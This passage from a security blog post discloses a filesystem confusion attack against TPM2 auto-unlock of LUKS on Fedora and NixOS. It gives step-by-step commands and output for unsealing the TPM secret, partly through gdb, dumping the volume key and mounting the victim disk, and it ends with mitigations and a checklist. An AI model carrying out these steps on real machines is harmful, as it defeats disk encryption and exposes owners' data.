</span><span>  </span><span>"protected"</span><span>: </span><span>"eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ"</span><span>,
</span><span>  </span><span>"tag"</span><span>: </span><span>"7DIhyL_ZNocrUHTPr1PQWg"
</span><span>}
</span><span>
</span><span># Convert this format into the actual JWE token format
</span><span>localhost:~#</span><span> jose jwe fmt</span><span> -i</span><span> jwe.json</span><span> -c </span><span>| </span><span>tee</span><span> token.txt
</span><span>eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwiY2xldmlzIjp7InBpbiI6InRwbTIiLCJ0cG0yIjp7Imhhc2giOiJzaGEyNTYiLCJqd2tfcHJpdiI6IkFOMEFJRXFpblRfb3Y5cTZHVFo3TU1TcW0tUXgzT1RNaEN6ZTVTUUxRTDhDbGNoakFCQ3Z5Tldyd2lZalRaVzZUNG1rSjd4UF9CeDlCa2N0UXFFZzF6eUZ4aTdMcTRBWTcxWnpGOEVrano3QmRlVWZ3TV9PT2pOdGVGcmZFdUItQzRONGRhWDZ0VHk3RTBrc3BuS3luN3VRQ0p6VDVrcU4yYkpPM0FGTEpwbG1JNWxseXhVdHNQZmRSamhSTFUyWXN6V2Fvay1VQlZsNGtuOWNHTUZCNFdZQmFHd01oM0QwZjF1TjdQUVV4cGx6bWtRSmQzX1FRUGZBM3VNMDZRcXY4OU14STVCc3dra3FiWEhSVmhNNFVCOXNLcjd0dzgzVkFFdXpzZ3c5OXciLCJqd2tfcHViIjoiQUU0QUNBQUxBQUFFa2dBZ2d1X2RMZTk2Z0dyRkZycWw2NXltWG5DQ1RMWWVMYXFkQ0NfSkRRa0R4M01BRUFBZ1UwVFhKaXZhaTVuWVNONGNUT05lNkNJR0djX2ZGbDd6ZlNsNUZuOTFvU0kiLCJrZXkiOiJlY2MiLCJwY3JfYmFuayI6InNoYTI1NiIsInBjcl9pZHMiOiI0LDUsNyw5In19fQ..5zuFP0kEuqiCh0QL.hNNirkMsfcEWcVKfTFCY3JKNCk0x-8P4svgzkeulNhHnuaOdFQ4YfOCUUX9pkWvonfE2uivS.7DIhyL_ZNocrUHTPr1PQWg
</span><span>
</span><span># Use the clevis-decrypt-tpm2 script to decrypt it with the TPM2
</span><span>localhost:~#</span><span> cat token.txt </span><span>| </span><span>tr -d </span><span>'\n' </span><span>| </span><span>clevis-decrypt-tpm2
</span><span>4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA
</span></code></pre><p>Awesome! We got a password out of it, which is the password
<code>clevis</code> originally added to the LUKS partition and
which can be used to unlock it! Let's also dump the volume key for
future "safekeeping" 🤡:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak</span><span> --dump-volume-key --volume-key-file</span><span> volume-key.txt \
</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA)
</span><span># [...]
</span><span>Are</span><span> you sure</span><span>?</span><span> (Type </span><span>'yes'</span><span> in capital letters)</span><span>:</span><span> YES
</span><span>LUKS</span><span> header information for /mnt/luks-original.bak
</span><span>Cipher</span><span> name:    aes
</span><span>Cipher</span><span> mode:    xts-plain64
</span><span>Payload</span><span> offset: 32768
</span><span>UUID:</span><span>           779328d5-00ca-4ade-be44-6daa549642ed
</span><span>MK</span><span> bits:        512
</span><span>Key</span><span> stored to file volume-key.txt.
</span><span>
</span><span>[root@localhost]#</span><span> cat volume-key.txt </span><span>| </span><span>hexdump
</span><span>0000000</span><span> 0e42 f904 ae92 97a2 84a0 920a 3b09 faf5
</span><span>0000010</span><span> 4feb 1775 b0de 0448 e4f4 c57f 35e6 7e34
</span><span>0000020</span><span> d200 2016 8623 2cd2 5e8e 2262 320a 3e74
</span><span>0000030</span><span> 6411 6454 866a d81e 88ff 8dbf b70b 9eef
</span><span>0000040
</span></code></pre><p>At this point we only have to restore the partition to its
original state and decrypt the real partition. We can either reboot
into a live system (possible if the Microsoft keys are still in the
secure boot database) or put the disk back into a system we
control. Finally, we can mount the encrypted disk to have a look
inside:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> dd if=/mnt/luks-original.bak of=/dev/nvme0n1p3 bs=64M count=1
</span><span>[root@localhost]#</span><span> cryptsetup luksOpen /dev/nvme0n1p3 original \
</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 4yurbtxybpBwHBi2O2Kea1vDmhjDRt6yudAKYXinsiI3EUSjwYhwZA)
</span><span>[root@localhost]#</span><span> mount /dev/mapper/original /mnt
</span><span>[root@localhost]#</span><span> cat /mnt/etc/os-release
</span><span>NAME</span><span>=</span><span>"Fedora Linux"
</span><span>VERSION</span><span>=</span><span>"41 (Server Edition)"
</span><span>RELEASE_TYPE</span><span>=</span><span>stable
</span><span>ID</span><span>=</span><span>fedora
</span><span>VERSION_ID</span><span>=</span><span>41
</span><span>VERSION_CODENAME</span><span>=</span><span>""
</span><span>PLATFORM_ID</span><span>=</span><span>"platform:f41"
</span><span>PRETTY_NAME</span><span>=</span><span>"Fedora Linux 41 (Server Edition)"
</span><span>ANSI_COLOR</span><span>=</span><span>"0;38;2;60;110;180"
</span><span>LOGO</span><span>=</span><span>fedora-logo-icon
</span><span>CPE_NAME</span><span>=</span><span>"cpe:/o:fedoraproject:fedora:41"
</span><span>HOME_URL</span><span>=</span><span>"https://fedoraproject.org/"
</span><span>DOCUMENTATION_URL</span><span>=</span><span>"https://docs.fedoraproject.org/en-US/fedora/f41/system-administrators-guide/"
</span><span>SUPPORT_URL</span><span>=</span><span>"https://ask.fedoraproject.org/"
</span><span>BUG_REPORT_URL</span><span>=</span><span>"https://bugzilla.redhat.com/"
</span><span>REDHAT_BUGZILLA_PRODUCT</span><span>=</span><span>"Fedora"
</span><span>REDHAT_BUGZILLA_PRODUCT_VERSION</span><span>=</span><span>41
</span><span>REDHAT_SUPPORT_PRODUCT</span><span>=</span><span>"Fedora"
</span><span>REDHAT_SUPPORT_PRODUCT_VERSION</span><span>=</span><span>41
</span><span>SUPPORT_END</span><span>=</span><span>2025-05-13
</span><span>VARIANT</span><span>=</span><span>"Server Edition"
</span><span>VARIANT_ID</span><span>=</span><span>server
</span></code></pre><p>Success! Apart from researching all of the tools and their
internals this has been a rather simple process. I would even claim
that with some preparation we can repeat this reliably in under 10
minutes. All it takes is two disk swaps and a few reboots.</p><p><em>Finally I can rest easy knowing that my roommate can make a
surprise backup of my server's data while I'm away 🎉. A solid
3-2-1(+1) strategy.</em></p><h2 id="proof-of-concept-exploitation-of-a-nixos-machine"><span><span><a href="#proof-of-concept-exploitation-of-a-nixos-machine" aria-label="Anchor link for: proof-of-concept-exploitation-of-a-nixos-machine">🔗</a></span> Proof-of-concept exploitation of a NixOS machine</span></h2><p><em>This will be very similar to the previous PoC, so I skipped
a lot of the boilerplate this time. If you are not specifically
interested in NixOS or systemd-cryptenroll, you can jump to the
next section <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/#what-now">by clicking here</a>.</em></p><p>Secure boot on NixOS is currently implemented by the awesome
<a href="https://github.com/nix-community/lanzaboote">lanzaboote</a>
project, which does some things differently than what we just saw
on Fedora. Most notably we will enroll our own secure boot keys
(and can wipe the microsoft keys), our kernel and initrd will both
be fully signed as a UKI image and systemd-boot will not allow you
to edit the command line. Another small difference to the Fedora
setup is that we will use <code>systemd-cryptenroll</code> instead
of <code>clevis</code>.</p><p>In any case, the overall exploitation will be very similar, the
NixOS initrd also doesn't verify LUKS identities (as of January
2025).</p><h4 id="system-setup"><span><span><a href="#system-setup" aria-label="Anchor link for: system-setup">🔗</a></span> System setup</span></h4><p>Fortunately, the setup is extremely simple with lanzaboote. I
recommend having a look at their <a href="https://github.com/nix-community/lanzaboote/blob/master/docs/QUICK_START.md">Quick Start Guide</a> in case you don't know the project already.
I've added the full configuration of the test machine <a href="https://oddlama.org/bypassing-disk-encryption/flake.nix">here</a>, in case you want
to replicate this. The final setup steps were:</p><pre data-lang="bash"><code data-lang="bash"><span># Clear secure boot keys, start nixos live image, copy flake to live image, then:
</span><span>[root@nixos]#</span><span> alias nix=</span><span>'nix --experimental-features "nix-command flakes"'
</span><span>[root@nixos]#</span><span> nix build</span><span> --print-out-paths</span><span> .#nixosConfigurations.nixos.config.system.build.diskoScript
</span><span>/nix/store/1a51ykfsdnc0rpzlawyy7rvb889l6874-disko
</span><span>[root@nixos]#</span><span> nix build</span><span> --print-out-paths</span><span> .#nixosConfigurations.nixos.config.system.build.toplevel
</span><span>/nix/store/5yqhbkqqw1kcr13157z4am1r5i02ll0d-nixos-system-nixos-25.05.20250110.130595e
</span><span>
</span><span># Format and install:
</span><span>[root@nixos]#</span><span> /nix/store/1a51ykfsdnc0rpzlawyy7rvb889l6874-disko  </span><span># Format disk(s)
</span><span>[root@nixos]#</span><span> nixos-install</span><span> --no-root-password --system </span><span>\        </span><span># Install system
</span><span>                </span><span>/nix/store/5yqhbkqqw1kcr13157z4am1r5i02ll0d-nixos-system-nixos-25.05.20250110.130595e
</span><span>[root@nixos]#</span><span> nixos-enter</span><span> --mountpoint</span><span> /mnt</span><span> --</span><span> sbctl create-keys </span><span># Create and enroll secure boot keys, need to rerun install afterwards to make lanzaboote happy
</span><span>
</span><span># Reboot and enroll LUKS key:
</span><span>[root@nixos]#</span><span> systemd-cryptenroll /dev/disk/by-partlabel/disk-main-luks</span><span> --tpm2-device</span><span>=</span><span>auto</span><span> --tpm2-pcrs</span><span>=</span><span>0+2+4+7
</span><span># ... Enter password ...
</span><span>New</span><span> TPM2 token enrolled as key slot 1.
</span></code></pre><h4 id="inspecting-the-system-1"><span><span><a href="#inspecting-the-system-1" aria-label="Anchor link for: inspecting-the-system-1">🔗</a></span> Inspecting the system</span></h4><p>This step works in the same was as it did for Fedora, but we
will find that the NixOS initrd works a bit differently - it itself
is a kind of mini-NixOS. The important information is the
following:</p><ul><li>The mount commands for filesystems are in systemd units, which
usually use UUIDs, labels or partlables to identify disks. In our
case it will be partlabels, so we don't even have to fake any
UUIDs.</li><li>Once the initrd decrypts the root partition, it searches for
the toplevel derivation by resolving the
<code>init=/nix/store/&lt;hash&gt;-nixos-system-.../init</code>
path</li><li>This toplevel derivation contains a <code>prepare-root</code>
binary which is the first one that is executed. This is our entry
point.</li></ul><h4 id="luks-partition-backup-and-overwrite"><span><span><a href="#luks-partition-backup-and-overwrite" aria-label="Anchor link for: luks-partition-backup-and-overwrite">🔗</a></span>
LUKS partition backup and overwrite</span></h4><p>Next, we overwrite the LUKS partition and overwrite it with our
fake. We can reuse the same fake partition with the Alpine image as
on Fedora as it has the advantage of being very small. If the user
has <code>/nix</code> on a separate partition it may be simpler to
just build a small NixOS system and link the resulting toplevel
derivation to the path expected by the initrd.</p><p>Rebooting the original system with the modified disk will now
yield an Alpine root shell. After running <code>tpm2_pcrread</code>
we can verify that we have not changed any PCRs with our
modifications. To understand the differences of
<code>systemd-cryptenroll</code> over <code>clevis</code>, let's
continue with some more detail from here:</p><p>Once again we will inspect the LUKS header of our backup, which
I've also copied over to the boot partition for easy access. We see
that <code>systemd-cryptenroll</code> creates a token in the LUKS
header, similar to <code>clevis</code>:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak
</span><span>LUKS</span><span> header information
</span><span>Version:</span><span>        2
</span><span>Epoch:</span><span>          6
</span><span>Metadata</span><span> area:  16384 </span><span>[</span><span>bytes</span><span>]
</span><span>Keyslots</span><span> area:  16744448 </span><span>[</span><span>bytes</span><span>]
</span><span>UUID:</span><span>           5a9d9566-aae2-49b9-abf5-c6f0a887159c
</span><span># [...]
</span><span>Tokens:
</span><span>  </span><span>0:</span><span> systemd-tpm2
</span><span>    </span><span>Keyslot:</span><span>    1
</span><span># [...]
</span><span>
</span><span>[root@localhost]#</span><span> cryptsetup token export</span><span> --token-id</span><span> 0 /mnt/luks-original.bak </span><span>| </span><span>tee</span><span> token.json
</span><span>{
</span><span>  </span><span>"type"</span><span>: </span><span>"systemd-tpm2"</span><span>,
</span><span>  </span><span>"keyslots"</span><span>: </span><span>[ </span><span>"1" </span><span>]</span><span>,
</span><span>  </span><span>"tpm2-blob"</span><span>: </span><span>"AJ4AIPtjVjiz90zIPEHgRoJVpsix/e1tBRaMkOv0tWEBBKegABC5vMp9mQt81TjlRmtEhca98VfRuXxAoYcB5yjzShhTZhfCzwgXpC7rd5TETxBhvtWbo4BQULmZT29InkqpXRaO/b7DyXqLDQusdAfQO/lQSVxwWjVR576OFJUvAMPN6XEVyH8jDFd+F5FtuaEsYS4t46ThxMWa10ttRwBOAAgACwAABBIAIE8jssxPAKj8Duc+hrtEmIZxQS0Hv3Uptj92Ud33KVpBABAAIDBubaOpjc3KX/Lj0jHbe9plgv9wTIKYsUtFCKOGotRU"</span><span>,
</span><span>  </span><span>"tpm2-pcrs"</span><span>: </span><span>[</span><span> 0, 2, 4, 7 </span><span>]</span><span>,
</span><span>  </span><span>"tpm2-pcr-bank"</span><span>: </span><span>"sha256"</span><span>,
</span><span>  </span><span>"tpm2-policy-hash"</span><span>: </span><span>"4f23b2cc4f00a8fc0ee73e86bb44988671412d07bf7529b63f7651ddf7295a41"</span><span>,
</span><span>  </span><span>"tpm2_srk"</span><span>: </span><span>"gQAAAQAiAAt+KklPEEbTTiWnmjC8TapUFILGmpUxJHOLyhfoPjJpFwAAAAEAWgAjAAsAAwRyAAAABgCAAEMAEAADABAAIB/V/x4OEuiI/TAynXAqG6pJHrJH9GJoEtgjqa+C0AlkACDBNasZylLB/v5PdYsWfJgE/MXZeUi2LMVE/FXfbsyDAw=="
</span><span>}
</span></code></pre><p>The token format is slightly different to that from
<code>clevis</code>, it just contains all necessarey information on
the toplevel without a roundtrip through JWE. To understand how the
values are supposed to be used, we need to understand what
<code>systemd-cryptenroll</code> does to unlock the disk. In the
systemd source code we find that the responsible function is called
<a href="https://github.com/systemd/systemd/blob/main/src/cryptsetup/cryptsetup.c#L1834"><code>static int tpm2_unseal(...)</code></a>. Instead of tediously
replicating all the unmarshalling logic, we can just call
<code>systemd-cryptsetup</code> through gdb and dump the decrypted
secret after that function was called:</p><pre data-lang="bash"><code data-lang="bash"><span>gdb --args</span><span> systemd-cryptsetup attach test /mnt/luks-original.img
</span><span># [...]
</span><span>(</span><span>gdb</span><span>) break tpm2_unseal
</span><span>Function </span><span>"tpm2_unseal"</span><span> not defined.
</span><span>Make</span><span> breakpoint pending on future shared library load</span><span>?</span><span> (y or </span><span>[</span><span>n</span><span>]</span><span>) </span><span>y
</span><span>Breakpoint</span><span> 1 (tpm2_unseal) </span><span>pending.
</span><span>(</span><span>gdb</span><span>) run
</span><span>Breakpoint</span><span> 1, 0x00007ffff7bb2f90 in tpm2_unseal ()
</span><span>(</span><span>gdb</span><span>) backtrace
</span><span>#0  0x00007ffff7bb2f90 in tpm2_unseal () from libsystemd-shared-256.so
</span><span>#1  0x00007ffff721d7e7 in acquire_luks2_key () from libcryptsetup-token-systemd-tpm2.so
</span><span>#2  0x00007ffff721c60f in cryptsetup_token_open_pin () from libcryptsetup-token-systemd-tpm2.so
</span><span>#3  0x00007ffff721caf5 in cryptsetup_token_open () from libcryptsetup-token-systemd-tpm2.so
</span><span># ...
</span></code></pre><p>By investigating the functions shown in the callstack, we see
that right before <a href="https://github.com/systemd/systemd/blob/cc7300fc5868f6d47f3f47076100b574bf54e58d/src/cryptsetup/cryptsetup-tokens/cryptsetup-token-systemd-tpm2.c#L35"><code>cryptsetup_token_open_pin()</code></a> returns, it base64
encodes the unsealed secret which is later used as the slot 1 LUKS
password. So we just set a breakpoint to the base64 encoding
function and print the secret once it returns (the result pointer
is the third argument, so it will be passed via
<code>rcx</code>):</p><pre data-lang="bash"><code data-lang="bash"><span>(</span><span>gdb</span><span>) break base64mem_full
</span><span>(</span><span>gdb</span><span>) continue
</span><span>(</span><span>gdb</span><span>) info registers
</span><span># ...
</span><span>rcx</span><span>            0x7fffffffc920      140737488341280 </span><span># pointer to base64 result
</span><span># ...
</span><span>(</span><span>gdb</span><span>) set $</span><span>a</span><span> = $</span><span>rcx </span><span># remember where the result will be stored
</span><span>(</span><span>gdb</span><span>) finish
</span><span>(</span><span>gdb</span><span>) printf </span><span>"%s\n"</span><span>, </span><span>*</span><span>(char</span><span>**</span><span>)$</span><span>a
</span><span>qvramS8M9tetETI1I53p6HWqh1avSqsj/uqpQbvE90s</span><span>=
</span></code></pre><p>Let's test this password by dumping the volume key.</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /mnt/luks-original.bak</span><span> --dump-volume-key --volume-key-file</span><span> volume-key.txt \
</span><span>                    --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n </span><span>"qvramS8M9tetETI1I53p6HWqh1avSqsj/uqpQbvE90s="</span><span>)
</span><span># [...]
</span><span>Are</span><span> you sure</span><span>?</span><span> (Type </span><span>'yes'</span><span> in capital letters)</span><span>:</span><span> YES
</span><span>LUKS</span><span> header information for copy.img
</span><span>Cipher</span><span> name:    aes
</span><span>Cipher</span><span> mode:    xts-plain64
</span><span>Payload</span><span> offset: 32768
</span><span>UUID:</span><span>           5a9d9566-aae2-49b9-abf5-c6f0a887159c
</span><span>MK</span><span> bits:        512
</span><span>Key</span><span> stored to file volume-key.txt.
</span><span>
</span><span>[root@localhost]#</span><span> cat volume-key.txt </span><span>| </span><span>hexdump
</span><span>0000000</span><span> 065a cc94 26c0 b0cc 4bcf bf73 e9bb 3c16
</span><span>0000010</span><span> 95da 149e 6881 1a5b e7f5 4b59 4bc9 db83
</span><span>0000020</span><span> 6008 d237 29a8 9fc7 7a83 dbbf 816e 5ad0
</span><span>0000030</span><span> 20fa 03f6 effd 39f5 1f78 8779 c501 35b6
</span><span>0000040
</span></code></pre><p>Nice, we've successfully extracted the volume key again!
Finally, we need to restore the original disk header and are then
able to decrypt the whole disk. We can either decrypt it by
specifying the volume key explicitly, or simply enter the obtained
password. Since this is exactly the same as on Fedora, I have not
included it here.</p><h4 id="crude-implementation-of-pcr15-verification"><span><span><a href="#crude-implementation-of-pcr15-verification" aria-label="Anchor link for: crude-implementation-of-pcr15-verification">🔗</a></span>
Crude implementation of PCR15 verification</span></h4><p>I've looked at all of this together with my friend <a href="https://github.com/patrickdag">@PatrickDaG</a>, who has quickly
written <a href="https://forge.lel.lol/patrick/nix-config/src/commit/ab2cb2b4d554040ce208fc60624fe729a9d5e32b/modules/ensure-pcr.nix">a NixOS module</a> which you can adapt to add a crude form of PCR
15 verification. Ideally we need something proper upstreamed into
nixpkgs, but ensuring the order of decryption is not super
simple.</p><h2 id="what-now"><span><span><a href="#what-now" aria-label="Anchor link for: what-now">🔗</a></span> What now?</span></h2><p>It's obviously a pity that the default initrd implementations
available on most distributions don't include a verification step
out of the box. But there's really nobody to blame here, as none of
the distributions advertise automatic TPM unlocking as a secure or
even supported configuration, and the guides I've linked to are
mostly blog posts from other hobbyists - who may just not have
known about this issue.</p><p><em>If you happen to have written about this before, please
update your post(s) to make your readers aware of the implications!
Thank you!</em></p><p>Unfortunately, I have also not found a simple solution that I
can recommend to you right now to actually fix the issue (except
for NixOS, <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/#crude-implementation-of-pcr15-verification">see above</a>). Enabling mandatory LUKS key measurement and PCR 15
verification in the initrd is just not something that is easily
available as a module or script right now (January 2025), so you'd
have to implement it yourself.</p><p>From what I learned when researching this, a proper
implementation would need to at least:</p><ul><li>Predict the value of PCR 15 value at initrd generation
time</li><li>Implicitly sign this value by adding it to the initrd</li><li>Extend PCR 15 at boot time with the volume key of every
decrypted LUKS volume, while ensuring in a deterministic decryption
order</li><li>Verify PCR 15 against the known and signed value
<em>before</em> utilizing any data from one of the the encrypted
disks</li></ul><p>The easiest way to protect your data right now is to bite the
bullet and add a TPM PIN, for example by using
<code>systemd-cryptenroll --tpm2-with-pin=yes [...]</code> when
enrolling your key.</p><h2 id="conclusion"><span><span><a href="#conclusion" aria-label="Anchor link for: conclusion">🔗</a></span> Conclusion</span></h2><p>We've successfully carried out a filesystem confusion attack on
two completely different systems to extract their secret volume
key, and have seen that the majority of articles about TPM2
auto-unlock setups are likely vulnerable to this attack.</p><p>We learned that this problem is not easily fixed, as it requires
an additional verification step that cannot simply be activated on
most distributions at present. It is critical to ensure that there
is an unbroken chain of trust from the bootloader to the actual
system.</p><p>Here is a checklist of things to consider when setting up TPM2
auto-unlock:</p><ul><li>Your kernel and initramfs are both signed and verified (UKI or
MOK), or you are using PCR 9 together with a shim that hashes the
images at boot time.</li><li>You have enrolled a LUKS key in the TPM2 on at least PCR 7 (+9
if necessary).</li><li>If you are decrypting multiple devices in the initrd, their
decryption order is deterministic.</li><li>After decryption - and before any user executable is called -
the initramfs verifies the identity of all encrypted disks,
preferably by measuring a derivative of the volume key into PCR 15
for each disk.</li><li>Your initrd's emergency shell (if any) is
password-protected.</li><li>Your bootloader does not allow you to alter the kernel command
line, or you've included a PCR used in the LUKS key enrollment that
depends on the kernel command line.</li></ul><p>Thank you for taking the time to read this article - I hope you
found it both interesting and enjoyable 😊.</p><hr><p>If you'd like to send me feedback or just reach out, feel free
to contact me on <a href="https://matrix.to/#/@oddlama:matrix.org">Matrix</a>!</p></div></div>]]></description>
        </item>
    </channel>
</rss>